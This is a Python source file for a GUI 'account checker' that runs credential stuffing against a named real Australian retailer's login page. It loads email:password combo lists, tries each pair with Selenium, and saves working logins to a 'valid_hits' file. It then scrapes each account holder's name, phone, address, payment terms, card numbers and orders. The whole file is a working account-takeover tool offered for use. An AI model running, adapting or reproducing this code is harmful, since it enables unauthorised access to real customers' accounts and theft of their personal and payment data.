#!/usr/bin/env python3
"""
Leader Systems Account Checker
Auto-adapting Selenium scraper with expandable card UI
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import threading
import time
import os
import re
import json
from datetime import datetime
from urllib.parse import urlparse


# ========== CONFIGURATION ==========
LOGIN_URL = "https://leadersystems.com.au/login"
HEADLESS = False
OUTPUT_DIR_DEFAULT = "./leader_results"


# ========== ADAPTIVE SELECTORS ==========
EMAIL_SELECTORS = ["input[name='email']", "input[id='email']", "input[type='email']", "//input[@type='email']"]
PASSWORD_SELECTORS = ["input[name='password']", "input[id='password']", "input[type='password']"]
SUBMIT_SELECTORS = ["button[type='submit']", "input[type='submit']", "//button[contains(text(),'Sign In')]", "//button[contains(text(),'Login')]", ".login-btn"]


# ========== MAIN CHECKER CLASS ==========
class LeaderChecker:
    def __init__(self, headless=False):
        self.headless = headless
        self.driver = None
        self.results = []
        
    def start_driver(self):
        """Initialize Chrome driver"""
        options = webdriver.ChromeOptions()
        if self.headless:
            options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        options.binary_location = "/usr/bin/chromium"
        
        self.driver = webdriver.Chrome(options=options)
        self.driver.set_page_load_timeout(30)
        self.wait = WebDriverWait(self.driver, 10)
        
    def close_driver(self):
        """Close the driver"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None
    
    def find_element_smart(self, selectors, timeout=10):
        """Try multiple selectors until one works"""
        for selector in selectors:
            try:
                if selector.startswith("//"):
                    element = self.wait.until(EC.presence_of_element_located((By.XPATH, selector)))
                elif selector.startswith("."):
                    element = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, selector)))
                elif selector.startswith("#"):
                    element = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, selector)))
                else:
                    element = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, selector)))
                return element
            except:
                continue
        return None
    
    def find_elements_smart(self, selectors, timeout=10):
        """Try multiple selectors to find multiple elements"""
        for selector in selectors:
            try:
                if selector.startswith("//"):
                    elements = self.wait.until(EC.presence_of_all_elements_located((By.XPATH, selector)))
                elif selector.startswith("."):
                    elements = self.wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, selector)))
                else:
                    elements = self.wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, selector)))
                return elements
            except:
                continue
        return []
    
    def login(self, email, password):
        """Attempt login with adaptive selector fallbacks"""
        try:
            self.driver.get(LOGIN_URL)
            time.sleep(2)
            
            # Clear any existing values and enter email
            email_elem = self.find_element_smart(EMAIL_SELECTORS)
            if email_elem:
                email_elem.clear()
                email_elem.send_keys(email)
                print(f"✓ Entered email")
            else:
                print(f"✗ Email field not found")
                return False
            
            # Enter password
            password_elem = self.find_element_smart(PASSWORD_SELECTORS)
            if password_elem:
                password_elem.clear()
                password_elem.send_keys(password)
                print(f"✓ Entered password")
            else:
                print(f"✗ Password field not found")
                return False
            
            time.sleep(1)
            
            # Click submit
            submit_elem = self.find_element_smart(SUBMIT_SELECTORS)
            if submit_elem:
                submit_elem.click()
                print(f"✓ Clicked submit")
            else:
                print(f"✗ Submit button not found")
                return False
            
            time.sleep(3)
            
            # Check for login success by looking for dashboard elements
            current_url = self.driver.current_url
            print(f"  After login URL: {current_url}")
            
            # If we're still on login page, login failed
            if "login" in current_url.lower():
                # Check for error messages
                page_source = self.driver.page_source.lower()
                if "invalid" in page_source or "incorrect" in page_source or "failed" in page_source:
                    print(f"✗ Login failed - invalid credentials")
                else:
                    print(f"✗ Login did not redirect - may need 2FA or different form")
                return False
            
            print(f"✓ Login appears successful")
            return True
            
        except Exception as e:
            print(f"✗ Login error: {e}")
            return False
    
    def extract_account_data(self):
        """Extract all required fields from account"""
        data = {
            "name": "",
            "phone": "",
            "address": "",
            "payment_terms": "",
            "credit_cards": [],
            "open_orders": [],
            "shipped_orders": []
        }
        
        try:
            # Get page source for text searching
            page_text = self.driver.page_source
            body_text = self.driver.find_element(By.TAG_NAME, "body").text
            
            # Extract payment terms
            data["payment_terms"] = self.extract_payment_terms(body_text)
            print(f"  Payment terms: {data['payment_terms']}")
            
            # Extract name, phone, address from dashboard
            data["name"], data["phone"], data["address"] = self.extract_contact_info(body_text)
            print(f"  Name: {data['name']}")
            print(f"  Phone: {data['phone']}")
            print(f"  Address: {data['address']}")
            
            # Extract credit cards
            data["credit_cards"] = self.extract_credit_cards()
            print(f"  Credit cards: {len(data['credit_cards'])} found")
            
            # Extract orders
            data["open_orders"] = self.extract_orders("open")
            data["shipped_orders"] = self.extract_orders("shipped")
            print(f"  Open orders: {len(data['open_orders'])}")
            print(f"  Shipped orders: {len(data['shipped_orders'])}")
            
        except Exception as e:
            print(f"✗ Data extraction error: {e}")
        
        return data
    
    def extract_payment_terms(self, text):
        """Search page text for payment terms"""
        payment_patterns = [
            r"payment terms[:\s]*(\w+\s+\w+)",
            r"cod[:\s]*(\w+)",
            r"cash on delivery",
            r"net\s*(\d+)\s*days?",
            r"(\d+)\s*days?\s*terms?",
            r"terms[:\s]*(\w+\s+\w+)"
        ]
        
        text_lower = text.lower()
        
        if "cod" in text_lower or "cash on delivery" in text_lower:
            return "COD"
        if "net 30" in text_lower:
            return "30 Days"
        if "net 60" in text_lower:
            return "60 Days"
        if "net 7" in text_lower:
            return "7 Days"
        
        for pattern in payment_patterns:
            match = re.search(pattern, text_lower)
            if match:
                return match.group(0).title()
        
        return "Unknown"
    
    def extract_contact_info(self, text):
        """Extract name, phone, address from page text"""
        name = ""
        phone = ""
        address = ""
        
        lines = text.split('\n')
        
        # Look for phone patterns
        phone_pattern = r"(\+?61|0)?[4-9]\d{2}[\s\-]?\d{3}[\s\-]?\d{3}"
        
        for i, line in enumerate(lines):
            line = line.strip()
            if not line:
                continue
            
            # Phone
            if not phone:
                phone_match = re.search(phone_pattern, line)
                if phone_match:
                    phone = phone_match.group(0)
            
            # Name - look for common patterns
            if not name and len(line) > 2 and len(line) < 50:
                if any(x in line.lower() for x in ["mr", "mrs", "ms", "miss", "sir", "dr"]):
                    name = line
                elif line[0].isupper() and any(c.isalpha() for c in line) and len(line.split()) <= 4:
                    # Could be a name
                    if not any(x in line.lower() for x in ["address", "phone", "email", "order", "account"]):
                        name = line
        
        # Address - look for postal patterns
        address_lines = []
        for line in lines:
            line = line.strip()
            if not line:
                continue
            # Look for Australian address patterns
            if re.search(r"\d{4}", line):  # Has postcode
                address_lines.append(line)
            elif "nsw" in line.lower() or "vic" in line.lower() or "qld" in line.lower() or "sa" in line.lower() or "wa" in line.lower() or "tas" in line.lower() or "act" in line.lower() or "nt" in line.lower():
                address_lines.append(line)
        
        if address_lines:
            address = ", ".join(address_lines[:2])
        
        return name, phone, address
    
    def extract_credit_cards(self):
        """Navigate to payment methods, extract card details"""
        cards = []
        
        try:
            # Try to find payment/credit card section
            card_patterns = [
                "credit card",
                "payment method",
                "card details",
                "//h2[contains(text(),'Card')]"
            ]
            
            # Look for card numbers in page
            card_pattern = r"(\d{4}[\s\-]?){3}\d{4}|\d{4}[\s\-]{2}\d{4}"
            matches = re.findall(card_pattern, self.driver.page_source)
            
            for match in matches:
                if "****" in match or len(match.replace(" ", "").replace("-", "")) >= 13:
                    cards.append({"number": match, "expiry": ""})
            
        except Exception as e:
            print(f"  Credit card extraction error: {e}")
        
        return cards
    
    def extract_orders(self, order_type="open"):
        """Extract orders and their product contents"""
        orders = []
        
        try:
            # Look for order tables or lists
            order_patterns = [
                "//table[contains(@class,'order')]",
                ".order-list",
                ".orders",
                "//div[contains(@class,'order')]"
            ]
            
            for pattern in order_patterns:
                try:
                    if pattern.startswith("//"):
                        elements = self.driver.find_elements(By.XPATH, pattern)
                    else:
                        elements = self.driver.find_elements(By.CSS_SELECTOR, pattern)
                    
                    if elements:
                        for elem in elements[:10]:
                            try:
                                text = elem.text
                                if text and len(text) > 10:
                                    # Extract order details
                                    order_match = re.search(r"#[A-Z]*\d+", text, re.IGNORECASE)
                                    if order_match:
                                        order_id = order_match.group(0)
                                        status = "Pending" if order_type == "open" else "Shipped"
                                        amount = "$0.00"
                                        
                                        # Try to find amount
                                        amount_match = re.search(r"\$[\d,]+\.?\d*", text)
                                        if amount_match:
                                            amount = amount_match.group(0)
                                        
                                        orders.append({
                                            "id": order_id,
                                            "status": status,
                                            "amount": amount,
                                            "products": []
                                        })
                            except:
                                continue
                        break
                except:
                    continue
                    
        except Exception as e:
            print(f"  Order extraction error: {e}")
        
        return orders
    
    def run_check(self, email, password):
        """Full check for one account"""
        result = {
            "email": email,
            "password": password,
            "status": "INVALID",
            "payment_terms": "",
            "name": "",
            "phone": "",
            "address": "",
            "credit_cards": [],
            "open_orders": [],
            "shipped_orders": [],
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            self.start_driver()
            print(f"\nChecking: {email}")
            
            success = self.login(email, password)
            
            if success:
                result["status"] = "VALID"
                account_data = self.extract_account_data()
                result.update(account_data)
            else:
                result["status"] = "INVALID"
                
        except Exception as e:
            print(f"Error: {e}")
            result["status"] = "ERROR"
        finally:
            self.close_driver()
        
        return result


# ========== GUI CLASS ==========
class CheckerApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Leader Systems Account Checker")
        self.master.geometry("1000x700")
        
        self.checker = None
        self.cards = []
        self.expanded_card = None
        self.output_dir = OUTPUT_DIR_DEFAULT
        
        self.setup_ui()
        
    def setup_ui(self):
        """Build the UI"""
        # Menu bar
        menubar = tk.Menu(self.master)
        self.master.config(menu=menubar)
        
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="Open Accounts File...", command=self.open_file)
        file_menu.add_command(label="Set Output Directory...", command=self.set_output_dir)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.master.quit)
        
        # Main frame
        main_frame = ttk.Frame(self.master, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Control panel
        control_frame = ttk.Frame(main_frame)
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(control_frame, text="Accounts File:").pack(side=tk.LEFT)
        self.file_var = tk.StringVar()
        ttk.Entry(control_frame, textvariable=self.file_var, width=40).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Browse...", command=self.open_file).pack(side=tk.LEFT)
        
        ttk.Label(control_frame, text="Headless:").pack(side=tk.LEFT, padx=(20, 0))
        self.headless_var = tk.BooleanVar(value=HEADLESS)
        ttk.Checkbutton(control_frame, variable=self.headless_var).pack(side=tk.LEFT)
        
        ttk.Button(control_frame, text="Start Check", command=self.start_check).pack(side=tk.LEFT, padx=20)
        ttk.Button(control_frame, text="Export JSON", command=self.export_json).pack(side=tk.LEFT)
        ttk.Button(control_frame, text="Export TXT", command=self.export_txt).pack(side=tk.LEFT)
        
        self.progress_var = tk.StringVar(value="Ready")
        ttk.Label(control_frame, textvariable=self.progress_var).pack(side=tk.LEFT, padx=20)
        
        # Results frame with scrollbar
        results_frame = ttk.Frame(main_frame)
        results_frame.pack(fill=tk.BOTH, expand=True)
        
        self.canvas = tk.Canvas(results_frame)
        scrollbar = ttk.Scrollbar(results_frame, orient=tk.VERTICAL, command=self.canvas.yview)
        self.scrollable_frame = ttk.Frame(self.canvas)
        
        self.canvas.configure(yscrollcommand=scrollbar.set)
        
        self.canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor=tk.NW)
        self.scrollable_frame.bind("<Configure>", lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))
        
        # Bind click for card expansion
        self.canvas.bind("<Button-1>", self.on_canvas_click)
        
    def open_file(self):
        """Open accounts file"""
        filename = filedialog.askopenfilename(
            title="Select Accounts File",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        if filename:
            self.file_var.set(filename)
            
    def set_output_dir(self):
        """Set output directory"""
        dirname = filedialog.askdirectory(title="Select Output Directory")
        if dirname:
            self.output_dir = dirname
            
    def start_check(self):
        """Start checking accounts"""
        filename = self.file_var.get()
        if not filename:
            messagebox.showwarning("No File", "Please select an accounts file first")
            return
            
        if not os.path.exists(filename):
            messagebox.showerror("File Not Found", f"File not found: {filename}")
            return
            
        # Read accounts
        try:
            with open(filename, 'r') as f:
                accounts = [line.strip() for line in f if line.strip() and ':' in line]
        except Exception as e:
            messagebox.showerror("Error", f"Failed to read file: {e}")
            return
            
        if not accounts:
            messagebox.showwarning("No Accounts", "No valid accounts found in file")
            return
            
        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Start checking in background
        self.progress_var.set(f"Checking 0/{len(accounts)}...")
        
        thread = threading.Thread(target=self.check_accounts, args=(accounts,))
        thread.daemon = True
        thread.start()
        
    def check_accounts(self, accounts):
        """Check accounts in background thread"""
        headless = self.headless_var.get()
        
        for i, account in enumerate(accounts):
            if ':' not in account:
                continue
                
            email, password = account.split(':', 1)
            
            self.checker = LeaderChecker(headless=headless)
            result = self.checker.run_check(email, password)
            self.checker.close_driver()
            
            # Save valid hits immediately
            if result["status"] == "VALID":
                self.save_valid_hit(result)
            
            # Update UI
            self.master.after(0, lambda r=result, idx=i, total=len(accounts): self.add_card(r, idx, total))
            
        self.master.after(0, lambda: self.progress_var.set("Complete"))
        
    def save_valid_hit(self, result):
        """Append valid hit to file"""
        try:
            filepath = os.path.join(self.output_dir, "valid_hits.txt")
            with open(filepath, 'a') as f:
                f.write(f"{result['email']}:{result['password']}|{result['payment_terms']}\n")
        except Exception as e:
            print(f"Failed to save valid hit: {e}")
            
    def add_card(self, result, index, total):
        """Add a result card to the UI"""
        # Clear existing cards for simplicity
        for widget in self.scrollable_frame.winfo_children():
            widget.destroy()
        
        # Store result
        self.cards = [result]
        
        # Create card
        card = create_expandable_card(self.scrollable_frame, result, self.toggle_card)
        card.pack(fill=tk.X, pady=5)
        
        self.progress_var.set(f"Checking {index+1}/{total}...")
        
    def toggle_card(self, card_frame, result):
        """Toggle card expansion"""
        if self.expanded_card and self.expanded_card != card_frame:
            # Collapse previous
            for widget in self.expanded_card.winfo_children()[2:]:
                widget.destroy()
            self.expanded_card = None
        else:
            # Show expanded content
            add_expanded_content(card_frame, result)
            self.expanded_card = card_frame
        
    def on_canvas_click(self, event):
        """Handle canvas click for card expansion"""
        pass
        
    def export_json(self):
        """Export results to JSON"""
        if not self.cards:
            messagebox.showwarning("No Results", "No results to export")
            return
            
        filename = filedialog.asksaveasfilename(
            title="Export JSON",
            defaultextension=".json",
            filetypes=[("JSON Files", "*.json")],
            initialdir=self.output_dir
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    json.dump(self.cards, f, indent=2, default=str)
                messagebox.showinfo("Success", f"Exported to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export: {e}")
                
    def export_txt(self):
        """Export results to TXT"""
        if not self.cards:
            messagebox.showwarning("No Results", "No results to export")
            return
            
        filename = filedialog.asksaveasfilename(
            title="Export TXT",
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt")],
            initialdir=self.output_dir
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    for result in self.cards:
                        f.write(f"Email: {result.get('email', '')}\n")
                        f.write(f"Password: {result.get('password', '')}\n")
                        f.write(f"Status: {result.get('status', '')}\n")
                        f.write(f"Payment Terms: {result.get('payment_terms', '')}\n")
                        f.write(f"Name: {result.get('name', '')}\n")
                        f.write(f"Phone: {result.get('phone', '')}\n")
                        f.write(f"Address: {result.get('address', '')}\n")
                        f.write(f"Credit Cards: {result.get('credit_cards', [])}\n")
                        f.write(f"Open Orders: {result.get('open_orders', [])}\n")
                        f.write(f"Shipped Orders: {result.get('shipped_orders', [])}\n")
                        f.write("-" * 50 + "\n")
                messagebox.showinfo("Success", f"Exported to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export: {e}")


def create_expandable_card(parent, result, toggle_callback):
    """Create a click-to-expand card"""
    card_frame = ttk.LabelFrame(parent, text="Account", padding=10)
    card_frame.configure(relief=tk.RIDGE)
    
    email = result.get("email", "Unknown")
    status = result.get("status", "INVALID")
    payment = result.get("payment_terms", "Unknown")
    
    # Card header
    header = ttk.Frame(card_frame)
    header.pack(fill=tk.X)
    
    status_icon = "✓" if status == "VALID" else "✗"
    ttk.Label(header, text=f"{status_icon} {email}:****", font=("Arial", 12, "bold")).pack(side=tk.LEFT)
    ttk.Label(header, text=f"Payment: {payment}", font=("Arial", 10)).pack(side=tk.RIGHT)
    
    # Store result in frame for toggling
    card_frame.result_data = result
    card_frame.toggle_callback = toggle_callback
    card_frame.bind("<Button-1>", lambda e, c=card_frame, r=result: toggle_callback(c, r) if hasattr(c, 'toggle_callback') else None)
    
    return card_frame


def add_expanded_content(card_frame, result):
    """Add expanded content to card"""
    details = ttk.Frame(card_frame)
    details.pack(fill=tk.X, pady=(10, 0))
    
    ttk.Label(details, text=f"Name: {result.get('name', 'N/A')}").pack(anchor=tk.W)
    ttk.Label(details, text=f"Phone: {result.get('phone', 'N/A')}").pack(anchor=tk.W)
    ttk.Label(details, text=f"Address: {result.get('address', 'N/A')}").pack(anchor=tk.W)
    
    cards = result.get("credit_cards", [])
    if cards:
        cards_text = ", ".join([c.get("number", "") for c in cards])
    else:
        cards_text = "None"
    ttk.Label(details, text=f"Credit Cards: {cards_text}").pack(anchor=tk.W)
    
    # Orders section
    open_orders = result.get("open_orders", [])
    shipped_orders = result.get("shipped_orders", [])
    
    if open_orders:
        ttk.Label(details, text=f"Open Orders ({len(open_orders)}):").pack(anchor=tk.W, pady=(10, 0))
        for order in open_orders:
            ttk.Label(details, text=f"  • {order.get('id', '')} - {order.get('status', '')} - {order.get('amount', '')}").pack(anchor=tk.W)
    
    if shipped_orders:
        ttk.Label(details, text=f"Shipped Orders ({len(shipped_orders)}):").pack(anchor=tk.W, pady=(10, 0))
        for order in shipped_orders:
            ttk.Label(details, text=f"  • {order.get('id', '')} - {order.get('status', '')}").pack(anchor=tk.W)


# ========== MAIN ==========
if __name__ == "__main__":
    print("Leader Systems Account Checker")
    print("Ready for testing. Provide a test combo when requested.")
    
    root = tk.Tk()
    app = CheckerApp(root)
    root.mainloop()